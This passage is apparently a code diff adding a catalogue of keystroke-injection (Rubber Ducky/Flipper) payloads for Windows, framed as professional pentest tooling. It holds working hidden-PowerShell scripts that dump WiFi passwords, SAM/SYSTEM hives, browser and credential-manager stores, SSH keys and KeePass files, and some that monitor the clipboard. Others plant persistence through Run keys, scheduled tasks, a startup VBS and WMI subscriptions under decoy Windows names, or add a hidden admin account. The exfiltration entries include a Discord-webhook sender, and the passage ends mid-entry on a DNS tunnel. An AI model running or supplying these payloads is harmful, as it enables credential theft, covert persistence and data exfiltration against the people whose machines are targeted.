+STRING $out = "$env:TEMP\\startup.txt"; "=== HKLM RUN ===" | Out-File $out; Get-ItemProperty 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run' -ErrorAction SilentlyContinue | Format-List | Out-String | Out-File $out -Append; "=== HKCU RUN ===" | Out-File $out -Append; Get-ItemProperty 'HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run' -ErrorAction SilentlyContinue | Format-List | Out-String | Out-File $out -Append; "=== HKLM RUNONCE ===" | Out-File $out -Append; Get-ItemProperty 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce' -ErrorAction SilentlyContinue | Format-List | Out-String | Out-File $out -Append; "=== STARTUP FOLDERS ===" | Out-File $out -Append; Get-ChildItem "$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup" -ErrorAction SilentlyContinue | Select-Object Name, FullName | Format-Table | Out-String | Out-File $out -Append; Get-ChildItem "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup" -ErrorAction SilentlyContinue | Select-Object Name, FullName | Format-Table | Out-String | Out-File $out -Append; "=== AUTO-START SERVICES ===" | Out-File $out -Append; Get-Service | Where-Object { $_.StartType -eq 'Automatic' } | Select-Object Name, DisplayName, Status | Format-Table -AutoSize | Out-String -Width 200 | Out-File $out -Append; Invoke-Item $out
+ENTER`
+  },
+
+  // ==================== CREDENTIALS — PROFESSIONAL PENTEST ====================
+  {
+    id: 'cred-wifi-dump',
+    name: 'WiFi Password Extractor',
+    category: 'credentials',
+    description: 'Extracts all saved WiFi network profiles and their plaintext passwords using netsh. Formats as clean SSID:Password pairs.',
+    targetOS: ['windows'],
+    riskLevel: 'medium',
+    executionTime: '~6s',
+    detectionDifficulty: 'moderate',
+    format: 'ducky',
+    flipperCompat: true,
+    script: `REM WiFi Password Extractor
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -WindowStyle Hidden
+ENTER
+DELAY 1000
+STRING $out = "$env:TEMP\\wifi_creds.txt"; "=== WiFi Credentials ===" | Out-File $out; (netsh wlan show profiles) | Select-String ":(.+)$" | ForEach-Object { $name = $_.Matches.Groups[1].Value.Trim(); $pass = (netsh wlan show profile name="$name" key=clear) | Select-String "Key Content\\s+:\\s+(.+)$"; if ($pass) { "$name : $($pass.Matches.Groups[1].Value.Trim())" } else { "$name : (no password)" } } | Out-File $out -Append; Invoke-Item $out
+ENTER`
+  },
+  {
+    id: 'cred-browser-locations',
+    name: 'Browser Password Store Locator',
+    category: 'credentials',
+    description: 'Locates browser credential databases for Chrome, Firefox, Edge, Brave, and Opera. Maps Login Data, logins.json, and key storage files for offline extraction.',
+    targetOS: ['windows'],
+    riskLevel: 'medium',
+    executionTime: '~5s',
+    detectionDifficulty: 'easy',
+    format: 'ducky',
+    flipperCompat: true,
+    script: `REM Browser Password Store Locator
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -WindowStyle Hidden
+ENTER
+DELAY 1000
+STRING $out = "$env:TEMP\\browser_cred_paths.txt"; "=== BROWSER CREDENTIAL STORES ===" | Out-File $out; $paths = @{Chrome="$env:LOCALAPPDATA\\Google\\Chrome\\User Data";Edge="$env:LOCALAPPDATA\\Microsoft\\Edge\\User Data";Brave="$env:LOCALAPPDATA\\BraveSoftware\\Brave-Browser\\User Data";Opera="$env:APPDATA\\Opera Software\\Opera Stable";Firefox="$env:APPDATA\\Mozilla\\Firefox\\Profiles"}; foreach($b in $paths.Keys){ [Environment]::NewLine + "=== $b ===" | Out-File $out -Append; $bp = $paths[$b]; if(Test-Path $bp){ "Base: $bp" | Out-File $out -Append; if($b -ne 'Firefox'){ Get-ChildItem $bp -Recurse -Filter "Login Data" -ErrorAction SilentlyContinue | Select-Object FullName, Length, LastWriteTime | Format-Table | Out-String | Out-File $out -Append; $lsf = Join-Path $bp "Local State"; if(Test-Path $lsf){"Local State (encryption key): $lsf" | Out-File $out -Append} } else { Get-ChildItem $bp -Recurse -Filter "logins.json" -ErrorAction SilentlyContinue | Select-Object FullName, Length, LastWriteTime | Format-Table | Out-String | Out-File $out -Append; Get-ChildItem $bp -Recurse -Filter "key4.db" -ErrorAction SilentlyContinue | Select-Object FullName | Format-Table | Out-String | Out-File $out -Append } } else { "Not installed" | Out-File $out -Append } }; Invoke-Item $out
+ENTER`
+  },
+  {
+    id: 'cred-manager-dump',
+    name: 'Windows Credential Manager Dump',
+    category: 'credentials',
+    description: 'Dumps Windows Credential Manager entries using cmdkey and vaultcmd. Lists stored credentials for websites, RDP, network shares, and generic credentials.',
+    targetOS: ['windows'],
+    riskLevel: 'medium',
+    executionTime: '~5s',
+    detectionDifficulty: 'moderate',
+    format: 'ducky',
+    flipperCompat: true,
+    script: `REM Windows Credential Manager Dump
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -WindowStyle Hidden
+ENTER
+DELAY 1000
+STRING $out = "$env:TEMP\\cred_manager.txt"; "=== CMDKEY STORED CREDENTIALS ===" | Out-File $out; cmdkey /list | Out-File $out -Append; "=== VAULT LIST ===" | Out-File $out -Append; vaultcmd /list | Out-File $out -Append; "=== VAULT DETAILS ===" | Out-File $out -Append; vaultcmd /listcreds:"Windows Credentials" /all 2>$null | Out-File $out -Append; vaultcmd /listcreds:"Web Credentials" /all 2>$null | Out-File $out -Append; "=== CREDENTIAL FILES ===" | Out-File $out -Append; $credPath = "$env:LOCALAPPDATA\\Microsoft\\Credentials"; if(Test-Path $credPath){ Get-ChildItem $credPath | Select-Object Name, Length, LastWriteTime | Format-Table | Out-String | Out-File $out -Append } else { "No credential files found" | Out-File $out -Append }; Invoke-Item $out
+ENTER`
+  },
+  {
+    id: 'cred-sam-backup',
+    name: 'SAM/SYSTEM Hive Backup',
+    category: 'credentials',
+    description: 'Creates backup copies of SAM and SYSTEM registry hives for offline password hash extraction. Requires administrative privileges. Uses reg save command.',
+    targetOS: ['windows'],
+    riskLevel: 'critical',
+    executionTime: '~8s',
+    detectionDifficulty: 'hard',
+    format: 'ducky',
+    flipperCompat: true,
+    script: `REM SAM/SYSTEM Hive Backup - Requires Admin
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -WindowStyle Hidden -Command "Start-Process powershell -ArgumentList '-WindowStyle Hidden -Command $d=\\\"$env:TEMP\\\\hive_backup\\\"; New-Item -Path $d -ItemType Directory -Force | Out-Null; reg save HKLM\\SAM \\\"$d\\\\sam.bak\\\" /y 2>&1 | Out-File \\\"$d\\\\backup_log.txt\\\"; reg save HKLM\\SYSTEM \\\"$d\\\\system.bak\\\" /y 2>&1 | Out-File \\\"$d\\\\backup_log.txt\\\" -Append; reg save HKLM\\SECURITY \\\"$d\\\\security.bak\\\" /y 2>&1 | Out-File \\\"$d\\\\backup_log.txt\\\" -Append; \\\"Backup completed at $(Get-Date)\\\" | Out-File \\\"$d\\\\backup_log.txt\\\" -Append; explorer $d' -Verb RunAs"
+ENTER`
+  },
+  {
+    id: 'cred-ssh-discovery',
+    name: 'SSH Key Discovery',
+    category: 'credentials',
+    description: 'Searches for SSH private keys, known_hosts, config files, and authorized_keys across user profiles. Lists key types, permissions, and associated hosts.',
+    targetOS: ['windows'],
+    riskLevel: 'medium',
+    executionTime: '~8s',
+    detectionDifficulty: 'easy',
+    format: 'ducky',
+    flipperCompat: true,
+    script: `REM SSH Key Discovery
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -WindowStyle Hidden
+ENTER
+DELAY 1000
+STRING $out = "$env:TEMP\\ssh_keys.txt"; "=== SSH KEY DISCOVERY ===" | Out-File $out; Get-ChildItem "C:\\Users" -Directory | ForEach-Object { $ssh = Join-Path $_.FullName ".ssh"; if(Test-Path $ssh){ [Environment]::NewLine + "=== $($_.Name) ===" | Out-File $out -Append; Get-ChildItem $ssh -File | ForEach-Object { "File: $($_.Name) | Size: $($_.Length) | Modified: $($_.LastWriteTime)" | Out-File $out -Append; $first = Get-Content $_.FullName -TotalCount 1 -ErrorAction SilentlyContinue; if($first -match 'PRIVATE KEY'){ "  TYPE: PRIVATE KEY FOUND!" | Out-File $out -Append } elseif($_.Name -eq 'known_hosts'){ "  Known hosts: $((Get-Content $_.FullName -ErrorAction SilentlyContinue).Count) entries" | Out-File $out -Append } elseif($_.Name -eq 'config'){ "  SSH Config contents:" | Out-File $out -Append; Get-Content $_.FullName -ErrorAction SilentlyContinue | Out-File $out -Append } } } }; "=== PUTTY SESSIONS ===" | Out-File $out -Append; Get-ItemProperty 'HKCU:\\SOFTWARE\\SimonTatham\\PuTTY\\Sessions\\*' -ErrorAction SilentlyContinue | Select-Object PSChildName, HostName, UserName, PortNumber | Format-Table | Out-String | Out-File $out -Append; Invoke-Item $out
+ENTER`
+  },
+  {
+    id: 'cred-rdp-harvest',
+    name: 'RDP Credential Harvest',
+    category: 'credentials',
+    description: 'Discovers saved Remote Desktop connections, RDP history, stored credentials, and RDP certificate cache. Maps recent RDP targets from registry.',
+    targetOS: ['windows'],
+    riskLevel: 'medium',
+    executionTime: '~5s',
+    detectionDifficulty: 'easy',
+    format: 'ducky',
+    flipperCompat: true,
+    script: `REM RDP Credential Harvest
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -WindowStyle Hidden
+ENTER
+DELAY 1000
+STRING $out = "$env:TEMP\\rdp_creds.txt"; "=== RDP CONNECTION HISTORY ===" | Out-File $out; Get-ItemProperty 'HKCU:\\Software\\Microsoft\\Terminal Server Client\\Servers\\*' -ErrorAction SilentlyContinue | ForEach-Object { [PSCustomObject]@{Server=$_.PSChildName; UsernameHint=$_.UsernameHint} } | Format-Table | Out-String | Out-File $out -Append; "=== DEFAULT RDP SETTINGS ===" | Out-File $out -Append; Get-ItemProperty 'HKCU:\\Software\\Microsoft\\Terminal Server Client\\Default' -ErrorAction SilentlyContinue | Format-List | Out-String | Out-File $out -Append; "=== RDP FILES ===" | Out-File $out -Append; Get-ChildItem "$env:USERPROFILE" -Recurse -Filter "*.rdp" -ErrorAction SilentlyContinue | Select-Object FullName, LastWriteTime | Format-Table | Out-String | Out-File $out -Append; "=== STORED RDP CREDS ===" | Out-File $out -Append; cmdkey /list | Select-String "TERMSRV" | Out-File $out -Append; Invoke-Item $out
+ENTER`
+  },
+  {
+    id: 'cred-outlook-data',
+    name: 'Outlook Profile & Data Finder',
+    category: 'credentials',
+    description: 'Locates Outlook OST/PST data files, profile configurations, and cached credentials. Maps all Outlook data stores without extracting email content.',
+    targetOS: ['windows'],
+    riskLevel: 'medium',
+    executionTime: '~8s',
+    detectionDifficulty: 'easy',
+    format: 'ducky',
+    flipperCompat: true,
+    script: `REM Outlook Profile & Data Finder
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -WindowStyle Hidden
+ENTER
+DELAY 1000
+STRING $out = "$env:TEMP\\outlook_data.txt"; "=== OUTLOOK PROFILES ===" | Out-File $out; Get-ItemProperty 'HKCU:\\Software\\Microsoft\\Office\\*\\Outlook\\Profiles\\*\\*' -ErrorAction SilentlyContinue | Where-Object { $_.'Account Name' } | Select-Object 'Account Name', 'Display Name', 'Email' | Format-List | Out-String | Out-File $out -Append; "=== OST FILES ===" | Out-File $out -Append; Get-ChildItem "$env:LOCALAPPDATA\\Microsoft\\Outlook" -Filter "*.ost" -ErrorAction SilentlyContinue | Select-Object Name, @{N='SizeMB';E={[math]::Round($_.Length/1MB,2)}}, LastWriteTime | Format-Table | Out-String | Out-File $out -Append; "=== PST FILES ===" | Out-File $out -Append; Get-ChildItem "C:\\Users" -Recurse -Filter "*.pst" -ErrorAction SilentlyContinue -Depth 5 | Select-Object FullName, @{N='SizeMB';E={[math]::Round($_.Length/1MB,2)}}, LastWriteTime | Format-Table | Out-String | Out-File $out -Append; "=== AUTOCOMPLETE (NK2/DAT) ===" | Out-File $out -Append; Get-ChildItem "$env:LOCALAPPDATA\\Microsoft\\Outlook\\RoamCache" -ErrorAction SilentlyContinue | Select-Object Name, Length | Format-Table | Out-String | Out-File $out -Append; Invoke-Item $out
+ENTER`
+  },
+  {
+    id: 'cred-keepass-finder',
+    name: 'KeePass Database Finder',
+    category: 'credentials',
+    description: 'Searches the entire system for KeePass database files (.kdbx, .kdb), KeePass configuration files, and recently opened database paths from KeePass config.',
+    targetOS: ['windows'],
+    riskLevel: 'medium',
+    executionTime: '~15s',
+    detectionDifficulty: 'easy',
+    format: 'ducky',
+    flipperCompat: true,
+    script: `REM KeePass Database Finder
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -WindowStyle Hidden
+ENTER
+DELAY 1000
+STRING $out = "$env:TEMP\\keepass_scan.txt"; "=== KEEPASS DATABASE FILES ===" | Out-File $out; Get-ChildItem "C:\\Users" -Recurse -Include "*.kdbx","*.kdb" -ErrorAction SilentlyContinue -Depth 6 | Select-Object FullName, @{N='SizeMB';E={[math]::Round($_.Length/1MB,2)}}, LastWriteTime, LastAccessTime | Format-Table -AutoSize | Out-String -Width 300 | Out-File $out -Append; "=== KEEPASS INSTALLATION ===" | Out-File $out -Append; Get-ItemProperty HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* | Where-Object { $_.DisplayName -match 'KeePass' } | Select-Object DisplayName, DisplayVersion, InstallLocation | Format-List | Out-String | Out-File $out -Append; "=== KEEPASS CONFIG (Recent DBs) ===" | Out-File $out -Append; $kpConfig = "$env:APPDATA\\KeePass\\KeePass.config.xml"; if(Test-Path $kpConfig){ Select-String 'ConnectionInfo|Path|Database' $kpConfig | Out-File $out -Append } else { "No KeePass config found at default location" | Out-File $out -Append }; "=== OTHER PASSWORD MANAGERS ===" | Out-File $out -Append; @('1Password','Bitwarden','LastPass','Dashlane','Enpass') | ForEach-Object { $pm=$_; Get-ItemProperty HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*,HKLM:\\Software\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* -ErrorAction SilentlyContinue | Where-Object { $_.DisplayName -match $pm } | ForEach-Object { "$pm FOUND: $($_.DisplayName) v$($_.DisplayVersion)" | Out-File $out -Append } }; Invoke-Item $out
+ENTER`
+  },
+
+  // ==================== PERSISTENCE — PROFESSIONAL PENTEST ====================
+  {
+    id: 'persist-reg-run',
+    name: 'Registry Run Key Persistence',
+    category: 'persistence',
+    description: 'Adds a persistence entry to HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run that executes a payload at every user login. Uses a benign-looking registry name.',
+    targetOS: ['windows'],
+    riskLevel: 'high',
+    executionTime: '~4s',
+    detectionDifficulty: 'moderate',
+    format: 'ducky',
+    flipperCompat: true,
+    script: `REM Registry Run Key Persistence
+REM Adds HKCU Run entry - survives reboots, no admin needed
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -WindowStyle Hidden
+ENTER
+DELAY 1000
+STRING $name = 'WindowsSecurityHealthService'; $payload = 'powershell.exe -WindowStyle Hidden -EncodedCommand REPLACE_WITH_BASE64_PAYLOAD'; Set-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name $name -Value $payload -Force; if(Get-ItemProperty 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name $name -ErrorAction SilentlyContinue){ "SUCCESS: Persistence set as $name" } else { "FAILED: Could not write registry" }
+ENTER
+DELAY 1000
+STRING exit
+ENTER`
+  },
+  {
+    id: 'persist-schtask',
+    name: 'Scheduled Task Persistence',
+    category: 'persistence',
+    description: 'Creates a scheduled task that runs a payload at user logon. Uses a Windows-like task name for stealth. Task survives reboots and runs in user context.',
+    targetOS: ['windows'],
+    riskLevel: 'high',
+    executionTime: '~5s',
+    detectionDifficulty: 'moderate',
+    format: 'ducky',
+    flipperCompat: true,
+    script: `REM Scheduled Task Persistence
+REM Creates logon-triggered scheduled task
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -WindowStyle Hidden
+ENTER
+DELAY 1000
+STRING $taskName = 'MicrosoftEdgeUpdateTaskCore'; $action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-WindowStyle Hidden -EncodedCommand REPLACE_WITH_BASE64_PAYLOAD'; $trigger = New-ScheduledTaskTrigger -AtLogOn; $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden; Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -Description 'Microsoft Edge component update' -Force | Out-Null; if(Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue){ "SUCCESS: Task '$taskName' created" } else { "FAILED" }
+ENTER
+DELAY 1000
+STRING exit
+ENTER`
+  },
+  {
+    id: 'persist-startup-folder',
+    name: 'Startup Folder Payload Drop',
+    category: 'persistence',
+    description: 'Creates a VBS wrapper script in the user Startup folder that executes a hidden PowerShell payload at each login. Simple but effective persistence.',
+    targetOS: ['windows'],
+    riskLevel: 'high',
+    executionTime: '~4s',
+    detectionDifficulty: 'easy',
+    format: 'ducky',
+    flipperCompat: true,
+    script: `REM Startup Folder Payload Drop
+REM Drops VBS launcher in user Startup folder
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -WindowStyle Hidden
+ENTER
+DELAY 1000
+STRING $startup = "$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"; $vbs = Join-Path $startup 'SecurityHealth.vbs'; $content = 'Set objShell = CreateObject("WScript.Shell")' + [Environment]::NewLine + 'objShell.Run "powershell.exe -WindowStyle Hidden -EncodedCommand REPLACE_WITH_BASE64_PAYLOAD", 0, False'; [IO.File]::WriteAllText($vbs, $content); if(Test-Path $vbs){ "SUCCESS: Dropped $vbs" } else { "FAILED" }
+ENTER
+DELAY 1000
+STRING exit
+ENTER`
+  },
+  {
+    id: 'persist-wmi-event',
+    name: 'WMI Event Subscription Persistence',
+    category: 'persistence',
+    description: 'Creates a permanent WMI event subscription for fileless persistence. Triggers on system uptime exceeding 120 seconds after boot. Requires admin.',
+    targetOS: ['windows'],
+    riskLevel: 'critical',
+    executionTime: '~6s',
+    detectionDifficulty: 'very-hard',
+    format: 'ducky',
+    flipperCompat: true,
+    script: `REM WMI Event Subscription Persistence - Requires Admin
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -WindowStyle Hidden -Command "Start-Process powershell -ArgumentList '-WindowStyle Hidden -Command $filterName=\\\"WinSecHealthFilter\\\"; $consumerName=\\\"WinSecHealthConsumer\\\"; $query=\\\"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA \\\\\\\"Win32_PerfFormattedData_PerfOS_System\\\\\\\" AND TargetInstance.SystemUpTime >= 120 AND TargetInstance.SystemUpTime < 180\\\"; $filter=Set-WmiInstance -Namespace root\\\\subscription -Class __EventFilter -Arguments @{Name=$filterName;EventNamespace=\\\"root\\\\cimv2\\\";QueryLanguage=\\\"WQL\\\";Query=$query}; $consumer=Set-WmiInstance -Namespace root\\\\subscription -Class CommandLineEventConsumer -Arguments @{Name=$consumerName;CommandLineTemplate=\\\"powershell.exe -WindowStyle Hidden -EncodedCommand REPLACE_WITH_BASE64\\\"}; Set-WmiInstance -Namespace root\\\\subscription -Class __FilterToConsumerBinding -Arguments @{Filter=$filter;Consumer=$consumer} | Out-Null; \\\"WMI persistence installed\\\" | Out-File $env:TEMP\\\\wmi_persist.log' -Verb RunAs"
+ENTER`
+  },
+  {
+    id: 'persist-hidden-admin',
+    name: 'Hidden Local Admin Account',
+    category: 'persistence',
+    description: 'Creates a hidden local admin account with a dollar sign suffix (appears as machine account). Adds to Administrators group and hides from login screen via registry.',
+    targetOS: ['windows'],
+    riskLevel: 'critical',
+    executionTime: '~6s',
+    detectionDifficulty: 'hard',
+    format: 'ducky',
+    flipperCompat: true,
+    script: `REM Hidden Admin Account - Requires Admin
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -WindowStyle Hidden -Command "Start-Process powershell -ArgumentList '-WindowStyle Hidden -Command $user=\\\"svc_update$\\\"; $pass=\\\"P@ssw0rd!2024\\\"; net user $user $pass /add /y 2>&1 | Out-File $env:TEMP\\\\admin_create.log; net localgroup Administrators $user /add 2>&1 | Out-File $env:TEMP\\\\admin_create.log -Append; reg add \\\"HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Winlogon\\\\SpecialAccounts\\\\UserList\\\" /v $user /t REG_DWORD /d 0 /f 2>&1 | Out-File $env:TEMP\\\\admin_create.log -Append; \\\"Account created: $user\\\" | Out-File $env:TEMP\\\\admin_create.log -Append' -Verb RunAs"
+ENTER`
+  },
+  {
+    id: 'persist-dll-hijack',
+    name: 'DLL Search Order Hijack Setup',
+    category: 'persistence',
+    description: 'Identifies writable directories in the system PATH for DLL search order hijacking. Generates a template DLL drop location analysis for planting proxy DLLs.',
+    targetOS: ['windows'],
+    riskLevel: 'high',
+    executionTime: '~8s',
+    detectionDifficulty: 'hard',
+    format: 'ducky',
+    flipperCompat: true,
+    script: `REM DLL Search Order Hijack Analysis
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -WindowStyle Hidden
+ENTER
+DELAY 1000
+STRING $out = "$env:TEMP\\dll_hijack.txt"; "=== DLL HIJACK OPPORTUNITIES ===" | Out-File $out; "=== WRITABLE PATH DIRECTORIES ===" | Out-File $out -Append; $env:PATH -split ';' | Where-Object { $_ -and (Test-Path $_) } | ForEach-Object { $p = $_; $writable = try { $t = Join-Path $p ([IO.Path]::GetRandomFileName()); [IO.File]::Create($t).Close(); Remove-Item $t; $true } catch { $false }; [PSCustomObject]@{Path=$p; Writable=$writable; FileCount=(Get-ChildItem $p -Filter '*.dll' -ErrorAction SilentlyContinue).Count} } | Where-Object { $_.Writable } | Format-Table -AutoSize | Out-String -Width 200 | Out-File $out -Append; "=== COMMON HIJACKABLE DLLs ===" | Out-File $out -Append; @('version.dll','userenv.dll','dbghelp.dll','wer.dll','amsi.dll','profapi.dll') | ForEach-Object { $dll=$_; "Checking $dll..."; $found = Get-ChildItem -Path ($env:PATH -split ';') -Filter $dll -ErrorAction SilentlyContinue | Select-Object FullName; if($found){ "$dll found: $($found.FullName)" } else { "$dll NOT in PATH dirs - hijackable" } } | Out-File $out -Append; Invoke-Item $out
+ENTER`
+  },
+
+  // ==================== EXFILTRATION — PROFESSIONAL PENTEST ====================
+  {
+    id: 'exfil-doc-grabber',
+    name: 'Document Grabber',
+    category: 'exfiltration',
+    description: 'Copies recent documents (.docx, .pdf, .xlsx, .pptx, .txt) from Desktop, Documents, and Downloads to a staging directory. Filters by last modified within 30 days.',
+    targetOS: ['windows'],
+    riskLevel: 'high',
+    executionTime: '~15s',
+    detectionDifficulty: 'moderate',
+    format: 'ducky',
+    flipperCompat: true,
+    script: `REM Document Grabber - Recent Files
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -WindowStyle Hidden
+ENTER
+DELAY 1000
+STRING $stage = "$env:TEMP\\doc_stage"; New-Item $stage -ItemType Directory -Force | Out-Null; $log = "$stage\\_manifest.txt"; $exts = @('*.docx','*.doc','*.pdf','*.xlsx','*.xls','*.pptx','*.csv','*.txt'); $dirs = @("$env:USERPROFILE\\Desktop","$env:USERPROFILE\\Documents","$env:USERPROFILE\\Downloads"); $count = 0; foreach($dir in $dirs){ if(Test-Path $dir){ foreach($ext in $exts){ Get-ChildItem $dir -Filter $ext -Recurse -ErrorAction SilentlyContinue -Depth 3 | Where-Object { $_.LastWriteTime -gt (Get-Date).AddDays(-30) -and $_.Length -lt 10MB } | ForEach-Object { Copy-Item $_.FullName $stage -Force; "$($_.FullName) | $([math]::Round($_.Length/1KB))KB | $($_.LastWriteTime)" | Out-File $log -Append; $count++ } } } }; "Total files staged: $count" | Out-File $log -Append; explorer $stage
+ENTER`
+  },
+  {
+    id: 'exfil-screenshot-b64',
+    name: 'Screenshot Capture & Base64',
+    category: 'exfiltration',
+    description: 'Takes a screenshot of all displays, saves as PNG, and optionally base64 encodes it for exfiltration via text channels. Includes POST template for webhook upload.',
+    targetOS: ['windows'],
+    riskLevel: 'high',
+    executionTime: '~6s',
+    detectionDifficulty: 'moderate',
+    format: 'ducky',
+    flipperCompat: true,
+    script: `REM Screenshot Capture & Base64 Encode
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -WindowStyle Hidden
+ENTER
+DELAY 1000
+STRING Add-Type -AssemblyName System.Windows.Forms; Add-Type -AssemblyName System.Drawing; $screens = [System.Windows.Forms.Screen]::AllScreens; $bounds = [System.Drawing.Rectangle]::Empty; foreach($s in $screens){ $bounds = [System.Drawing.Rectangle]::Union($bounds, $s.Bounds) }; $bmp = New-Object System.Drawing.Bitmap($bounds.Width, $bounds.Height); $gfx = [System.Drawing.Graphics]::FromImage($bmp); $gfx.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size); $path = "$env:TEMP\\screen_$(Get-Date -Format 'yyyyMMdd_HHmmss').png"; $bmp.Save($path, [System.Drawing.Imaging.ImageFormat]::Png); $gfx.Dispose(); $bmp.Dispose(); $b64 = [Convert]::ToBase64String([IO.File]::ReadAllBytes($path)); $b64 | Out-File "$path.b64.txt"; "Screenshot: $path"; "Base64: $path.b64.txt"; "Size: $([math]::Round((Get-Item $path).Length/1KB))KB"
+ENTER`
+  },
+  {
+    id: 'exfil-discord-webhook',
+    name: 'Discord Webhook Exfiltration',
+    category: 'exfiltration',
+    description: 'Collects system info, network config, and running processes then sends the data to a Discord webhook as a formatted embed. Replace WEBHOOK_URL with your endpoint.',
+    targetOS: ['windows'],
+    riskLevel: 'high',
+    executionTime: '~8s',
+    detectionDifficulty: 'hard',
+    format: 'ducky',
+    flipperCompat: true,
+    script: `REM Discord Webhook Exfiltration
+REM Replace WEBHOOK_URL_HERE with your Discord webhook
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -WindowStyle Hidden
+ENTER
+DELAY 1000
+STRING $webhook = 'WEBHOOK_URL_HERE'; $hostname = $env:COMPUTERNAME; $user = $env:USERNAME; $ip = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.InterfaceAlias -notmatch 'Loopback' } | Select-Object -First 1).IPAddress; $os = (Get-WmiObject Win32_OperatingSystem).Caption; $av = (Get-MpComputerStatus -ErrorAction SilentlyContinue).AntivirusEnabled; $body = @{content="**RECON: $hostname**"; embeds=@(@{title="System Info";color=3447003;fields=@(@{name="Hostname";value=$hostname;inline=$true},@{name="User";value=$user;inline=$true},@{name="IP";value=$ip;inline=$true},@{name="OS";value=$os;inline=$false},@{name="AV Enabled";value="$av";inline=$true})})} | ConvertTo-Json -Depth 5; Invoke-RestMethod -Uri $webhook -Method Post -Body $body -ContentType 'application/json'
+ENTER
+DELAY 1000
+STRING exit
+ENTER`
+  },
+  {
+    id: 'exfil-clipboard-monitor',
+    name: 'Clipboard Content Monitor',
+    category: 'exfiltration',
+    description: 'Monitors and logs clipboard contents every 2 seconds for 60 seconds. Captures text, URLs, and potential credentials copied by the user.',
+    targetOS: ['windows'],
+    riskLevel: 'high',
+    executionTime: '~65s',
+    detectionDifficulty: 'hard',
+    format: 'ducky',
+    flipperCompat: true,
+    script: `REM Clipboard Monitor - 60 second capture
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -WindowStyle Hidden
+ENTER
+DELAY 1000
+STRING Add-Type -AssemblyName System.Windows.Forms; $log = "$env:TEMP\\clipboard_$(Get-Date -Format 'yyyyMMdd_HHmmss').txt"; $last = ''; $end = (Get-Date).AddSeconds(60); "=== CLIPBOARD MONITOR STARTED $(Get-Date) ===" | Out-File $log; while((Get-Date) -lt $end){ try { $clip = [System.Windows.Forms.Clipboard]::GetText(); if($clip -and $clip -ne $last){ $last = $clip; "[$(Get-Date -Format 'HH:mm:ss')] $clip" | Out-File $log -Append } } catch {}; Start-Sleep -Seconds 2 }; "=== MONITOR ENDED $(Get-Date) ===" | Out-File $log -Append; Invoke-Item $log
+ENTER`
+  },
+  {
+    id: 'exfil-outlook-draft',
+    name: 'Outlook Draft Email Exfiltration',
+    category: 'exfiltration',
+    description: 'Collects system recon data and saves it as an Outlook draft email. Does not send - draft can be retrieved later or used as dead-drop communication.',
+    targetOS: ['windows'],
+    riskLevel: 'high',
+    executionTime: '~10s',
+    detectionDifficulty: 'very-hard',
+    format: 'ducky',
+    flipperCompat: true,
+    script: `REM Outlook Draft Exfiltration - Creates draft, does NOT send
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -WindowStyle Hidden
+ENTER
+DELAY 1000
+STRING try { $ol = New-Object -ComObject Outlook.Application; $mail = $ol.CreateItem(0); $mail.Subject = "Meeting Notes $(Get-Date -Format 'MM/dd')"; $info = "HOST: $env:COMPUTERNAME" + [char]10 + "USER: $env:USERNAME" + [char]10 + "DOMAIN: $env:USERDOMAIN" + [char]10 + "IP: $((Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.InterfaceAlias -notmatch 'Loopback'} | Select-Object -First 1).IPAddress)" + [char]10 + "OS: $((Get-WmiObject Win32_OperatingSystem).Caption)" + [char]10 + "AV: $((Get-MpComputerStatus).AMServiceEnabled)" + [char]10 + [char]10 + "PROCESSES:" + [char]10 + "$(Get-Process | Select-Object -First 30 Name, Id | Out-String)"; $mail.Body = $info; $mail.Save(); "Draft saved successfully" | Out-File "$env:TEMP\\exfil_status.txt" } catch { "Outlook not available: $_" | Out-File "$env:TEMP\\exfil_status.txt" }
+ENTER
+DELAY 1000
+STRING exit
+ENTER`
+  },
+  {
+    id: 'exfil-dns-tunnel',
+    name: 'DNS Exfiltration Tunnel',
+    category: 'exfiltration',
+    description: 'Encodes system data into DNS queries sent to an attacker-controlled domain. Bypasses most firewalls as DNS is rarely blocked. Replace DOMAIN with your DNS server.',
+    targetOS: ['windows'],
